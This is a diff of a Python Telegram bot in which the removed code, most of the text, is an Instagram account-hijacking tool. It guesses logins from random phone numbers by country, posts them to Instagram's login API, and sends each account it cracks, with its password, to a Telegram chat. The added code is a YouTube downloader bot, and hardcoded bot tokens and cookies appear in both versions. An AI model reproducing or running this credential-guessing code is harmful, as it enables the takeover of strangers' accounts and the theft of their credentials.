@@ -1,796 +1,118 @@
-import webbrowser  
-import requests
-import random
+import requests,re
+from re import findall
 import telebot
-import os
 from telebot import types
-from uuid import uuid4
-import webbrowser
-import time
-Z = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-Z1 = '\033[2;31m' #احمر ثاني
-F = '\033[2;32m' #اخضر
-A = '\033[2;34m'#ازرق
-C = "\033[1;97m" #ابيض
-B = '\033[2;36m'#سمائي
-Y = '\033[1;34m' #ازرق فاتح
-E = '\033[1;31m' #احمر
-C = "\033[1;97m" #ابيض
 
-CaRiNo= """                                                   
-       _     ___                   ___       
-      dM.    `MM                   `MM       
-     ,MMb     MM                    MM       
-     d'YM.    MM   _____     ____   MM  __   
-    ,P `Mb    MM  6MMMMMb   6MMMMb\ MM 6MMb  
-    d'  YM.   MM 6M'   `Mb MM'    ` MMM9 `Mb 
-   ,P   `Mb   MM MM     MM YM.      MM'   MM 
-   d'    YM.  MM MM     MM  YMMMMb  MM    MM 
-  ,MMMMMMMMb  MM MM     MM      `Mb MM    MM 
-  d'      YM. MM YM.   ,M9 L    ,MM MM    MM 
-_dM_     _dMM_MM_ YMMMMM9  MYMMMM9 _MM_  _MM_
+bot = telebot.TeleBot("5339545164:AAGYoWHpe0aEpfWlSnY00dZhCVDqc0i0QYs")
 
-\033[1;31m--------------------------------
-\033[1;33m< \033[2;32mMy telegram channel ids tool Andy \033[1;33m>
-\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @oyurl
-\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @IIlAndylII
-\033[1;31m--------------------------------
- """
-#~~~~~~~~~~~~~~~{الاوان}~~~~~~~~~~~~~~~~#
-#~~~~~~~~~~~~~~~{Telegram}~~~~~~~~~~~~~~~~
-print(CaRiNo)
-ToKen = ("5502314410:AAHV-egEb89wWrZIzHjkJtYzhi9fYxvO09M")
-os.system('clear')
-bot = telebot.TeleBot(ToKen)
-@bot.message_handler(commands = ["start"])
-def Start(message):
- Name = message.chat.first_name
- User = message.from_user.username 
- ID = message.chat.id
- A = types.InlineKeyboardMarkup(row_width=2)
- B = types.InlineKeyboardButton(text ="✅ قناه المبرمج" , url = "t.me/oyurl")
- C = types.InlineKeyboardButton(text ="✅ مراسة مبرمج  " , url = "t.me/IIlAndylII")
- D =  types.InlineKeyboardButton(text = "✅ START HACK",callback_data="y")
- A.add(B,C,D)
- bot.reply_to(message, """  
-*- اهلا عزيزي ( {} )                             
-- في بوت صيد  حسابات ( Intagram )✅
-- قم بــ ضغط على ( START HACK ) لبدء الصيد               
-- معرفك : [ @{} ]                                    
-- ايديك : [ {} ]                                        *
-""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
-@bot.callback_query_handler(func=lambda call: True)
-def answer(call):
-    if call.data =="y":
-        button(call.message)
-    if call.data =="Iran":
-        Iran(call.message)
-    if call.data =="Iraq":
-         Iraq(call.message)
-    if call.data =="Tr":
-         TR(call.message)  
-    if call.data =="EG":
-    	EGYPT(call.message)
-    if call.data == "Ku":
-    	Kuwait(call.message)
-    if call.data == "SA":
-    	SAUDIA(call.message)
-    if call.data == "Mo":
-    	Morocco(call.message)
-P  = types.InlineKeyboardButton(text = "🇮🇷 IRAN : إيران", callback_data= 'Iran')
-P1 = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق", callback_data = 'Iraq')
-P2 = types.InlineKeyboardButton(text = "🇹🇷 TURKEY : تركيا", callback_data = 'Tr')
-P3 = types.InlineKeyboardButton(text = "🇪🇬 EGYPT :  مصر", callback_data = 'EG')
-P4 = types.InlineKeyboardButton(text = "🇰🇼 KUWAIT : الكويت", callback_data = 'Ku')
-P5 = types.InlineKeyboardButton(text = "🇸🇦 SAUDIA : السعودية", callback_data = 'SA')
-P6 = types.InlineKeyboardButton(text = "يوزرات رباعية : users 4",callback_data = 'Mo')
-def button(message):
-    O0 = types.InlineKeyboardMarkup(row_width=1)
-    O0.add(P6,P,P1,P2,P3,P4,P5)
-    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="اختار دولة تصيد عليها",parse_mode='markdown',reply_markup=O0)          
-def Iran(message):	
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321')
-		us = str(''.join((random.choice(user) for i in range(7))))
-		username = "+98938"+us
-		password = "0938"+us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI Andy ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o) 
-		
-def Iraq(message):	
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321')
-		us = str(''.join((random.choice(user) for i in range(7))))
-		username = '+964770' + us
-		password = '0770' + us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI Andy ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o) 
-def TR(message):	
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321')
-		us = str(''.join((random.choice(user) for i in range(7))))
-		username =  '+90531' + us
-		password = '0531' + us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI CARINO ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4) 
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o) 
-##
-#
-#
-#
-#
-#
+@bot.message_handler(commands=['start'])
+def start(message):
+    key = types.InlineKeyboardMarkup()
+    key.row_width = 2
+    btn1 = types.InlineKeyboardButton(text=f"- تحميل فيديو .",callback_data="vid")
+    btn2 = types.InlineKeyboardButton(text=f"- تحميل صوت .",callback_data="mp3")
+    btn3 = types.InlineKeyboardButton(text=f"- المبرمق .",url="https://t.me/O_GH0")
+    key.add(btn1,btn2)
+    key.add(btn3)
+    bot.reply_to(message,f"- اهلا بك في بوت تحميل يوتيوب\n- يمكنك التحكم من الاسفل ادناه ..\n- @oyurl .",reply_markup=key)
+@bot.callback_query_handler(func=lambda m:True)
+def qu(call):
+    if call.data == "vid":
+        mm = bot.send_message(call.message.chat.id,f"- قم بأرسال كلمة للبحث عن الفيديو .")
+        bot.register_next_step_handler(mm,downVid)
+    if call.data == "mp3":
+        mm = bot.send_message(call.message.chat.id,f"- قم بأرسال كلمة للبحث عن الفيديو .")
+        bot.register_next_step_handler(mm,downMp3)
+def downVid(message):
+    lii = message.text
+    p = bot.send_message(message.chat.id,f"- يتم البحث الان ..")
+    ul = requests.get(f"https://mr-abood.herokuapp.com/YouTube/Videos/Search?query={lii}&page=1")
+    if "id" in ul.text:
+        id = ul.json()[0]['id']
+        print(id)
+        title = ul.json()[0]['title']
+        dur = ul.json()[0]['duration']
+        vi = ul.json()[0]['viewCount']['short']
+        key2 = types.InlineKeyboardMarkup()
+        key2.row_width = 1
+        btn5 = types.InlineKeyboardButton(text=f"- المبرمق",url=f"https://t.me/O_GH0")
+        key2.add(btn5)
+        rtr = requests.get('https://yoodownload.com/').text
+        token = re.findall('<input name="token" type="hidden" value="(.*?)">',rtr)[0]
+        
+        hheaders = {
+    # trakos headers
+    'authority': 'yoodownload.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # Requests sorts cookies= alphabetically
+    'cookie': '_ga=GA1.2.89962626.1659127863; _gid=GA1.2.21866011.1659127863; _gat=1',
+    'origin': 'https://yoodownload.com',
+    'referer': 'https://yoodownload.com/index.php?error=41',
+    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+}
+        dataa = {
+    'u': f'https://youtu.be/{id}',
+    'token': f'{token}',
+        }
 
+        response = requests.post('https://yoodownload.com/download.php', headers=hheaders, data=dataa).text
+        lil = (re.findall('href="(.*?)"',response)[20])
+        bot.delete_message(chat_id=message.chat.id,message_id=p.message_id)
+        bot.send_video(message.chat.id,lil,caption=f"- العنوان : {title}\n- المشاهدات : {vi}",reply_markup=key2)
+    else:
+        bot.reply_to(message,f"صار خطأ ..")
+def downMp3(message):
+    lii = message.text
+    p = bot.send_message(message.chat.id,f"- يتم البحث الان ..")
+    ul = requests.get(f"https://mr-abood.herokuapp.com/YouTube/Videos/Search?query={lii}&page=1")
+    if "id" in ul.text:
+        id = ul.json()[0]['id']
+        print(id)
+        title = ul.json()[0]['title']
+        dur = ul.json()[0]['duration']
+        vi = ul.json()[0]['viewCount']['short']
+        key2 = types.InlineKeyboardMarkup()
+        key2.row_width = 1
+        btn5 = types.InlineKeyboardButton(text=f"- المبرمق",url=f"https://t.me/O_GH0")
+        key2.add(btn5)
+        rtr = requests.get('https://yoodownload.com/').text
+        token = re.findall('<input name="token" type="hidden" value="(.*?)">',rtr)[0]
+        
+        headers = {
+    'authority': 'api.onlinevideoconverter.pro',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'en-US,en;q=0.9',
+    # Already added when you pass json=
+    # 'content-type': 'application/json',
+    'origin': 'https://en.onlinevideoconverter.pro',
+    'referer': 'https://en.onlinevideoconverter.pro/',
+    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+}
 
-#
+        json_data = {
+    'url': f'https://youtu.be/{id}',
+    'converter': 'ffmpeg-mp3',
+}
 
-
-
-def EGYPT(message):
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321')
-		us = str(''.join((random.choice(user) for i in range(7))))
-		username = '+20112' + us
-		password = '0112' + us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI CARINO ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
